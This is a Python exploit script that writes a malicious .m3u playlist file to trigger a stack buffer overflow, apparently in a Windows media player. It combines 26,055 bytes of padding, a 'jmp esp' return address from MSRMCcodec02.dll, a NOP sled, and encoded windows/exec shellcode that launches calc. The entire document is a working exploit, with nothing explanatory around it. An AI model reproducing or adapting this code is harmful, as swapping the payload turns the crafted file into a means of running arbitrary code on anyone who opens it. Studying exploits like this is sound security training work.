import struct

file = "crash7.m3u"
junk = "\x41" * 26055

# Packs the address in little-endian.
# jmp esp from MSRMCcodec02.dll
eip = struct.pack('<I', 0x01B1B22A)

nops = "\x90" * 25

# Encoder: x86/shikata_ga_nai
# Payload: windows/exec
# EXITFUNC=seh, CMD=calc
# The payload
buf = "\xbf\x16\xb7\xef\x38\xdb\xca\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x30\x31\x7b\x13\x83\xeb\xfc\x03\x7b\x19\x55"
buf += "\x1a\xc4\xcd\x1b\xe5\x35\x0d\x7c\x6f\xd0\x3c\xbc\x0b"
buf += "\x90\x6e\x0c\x5f\xf4\x82\xe7\x0d\xed\x11\x85\x99\x02"
buf += "\x92\x20\xfc\x2d\x23\x18\x3c\x2f\xa7\x63\x11\x8f\x96"
buf += "\xab\x64\xce\xdf\xd6\x85\x82\x88\x9d\x38\x33\xbd\xe8"
buf += "\x80\xb8\x8d\xfd\x80\x5d\x45\xff\xa1\xf3\xde\xa6\x61"
buf += "\xf5\x33\xd3\x2b\xed\x50\xde\xe2\x86\xa2\x94\xf4\x4e"
buf += "\xfb\x55\x5a\xaf\x34\xa4\xa2\xf7\xf2\x57\xd1\x01\x01"
buf += "\xe5\xe2\xd5\x78\x31\x66\xce\xda\xb2\xd0\x2a\xdb\x17"
buf += "\x86\xb9\xd7\xdc\xcc\xe6\xfb\xe3\x01\x9d\x07\x6f\xa4"
buf += "\x72\x8e\x2b\x83\x56\xcb\xe8\xaa\xcf\xb1\x5f\xd2\x10"
buf += "\x1a\x3f\x76\x5a\xb6\x54\x0b\x01\xdc\xab\x99\x3f\x92"
buf += "\xac\xa1\x3f\x82\xc4\x90\xb4\x4d\x92\x2c\x1f\x2a\x62"
buf += "\xdc\x92\xa6\xf3\x47\x47\x8b\x99\x77\xbd\xcf\xa7\xfb"
buf += "\x34\xaf\x53\xe3\x3c\xaa\x18\xa3\xad\xc6\x31\x46\xd2"
buf += "\x75\x31\x43\xb1\x18\xa1\x0f\x36"

junk_shell = junk + eip + nops + buf

creation = open(file, 'w')
creation.write(junk_shell)
creation.close()

print("m3u File Created Successfully\n")

